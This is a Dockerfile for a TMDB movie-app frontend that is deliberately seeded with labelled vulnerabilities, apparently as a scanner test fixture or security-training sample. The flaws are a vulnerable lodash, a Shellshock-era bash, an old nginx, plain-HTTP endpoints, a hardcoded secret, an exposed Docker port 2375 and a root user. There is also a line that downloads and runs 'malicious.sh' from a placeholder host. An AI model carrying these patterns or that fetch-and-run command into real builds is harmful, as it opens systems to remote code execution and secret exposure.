# Stage 1: Build with vulnerable lodash package version
FROM node:16.17.0-alpine as builder

WORKDIR /app

COPY ./package.json .
COPY ./yarn.lock .

# Intentionally install a vulnerable lodash version (prototype pollution CVE-2019-10744)
RUN yarn add lodash@4.17.11

RUN yarn install

COPY . .

ARG TMDB_V3_API_KEY
ENV VITE_APP_TMDB_V3_API_KEY=${TMDB_V3_API_KEY}
ENV VITE_APP_API_ENDPOINT_URL="http://api.themoviedb.org/3"  # Insecure HTTP instead of HTTPS

# Hardcoded secret - vulnerable pattern
ENV SECRET_API_KEY="hardcoded_secret_key_123456"

RUN yarn build

# Stage 2: Use an older vulnerable Nginx alpine image
FROM nginx:1.18.0-alpine

WORKDIR /usr/share/nginx/html

# Install vulnerable bash version (Shellshock CVE)
RUN apk add --no-cache bash=4.3.30-r0

# Insecure download over HTTP (simulated)
RUN wget http://example.com/malicious.sh -O /tmp/mal.sh && sh /tmp/mal.sh || true

RUN rm -rf ./*

COPY --from=builder /app/dist .

EXPOSE 2375  # Expose Docker daemon port (insecure default)

# Run as root user (default, but explicit here for clarity)
USER root

ENTRYPOINT ["nginx", "-g", "daemon off;"]
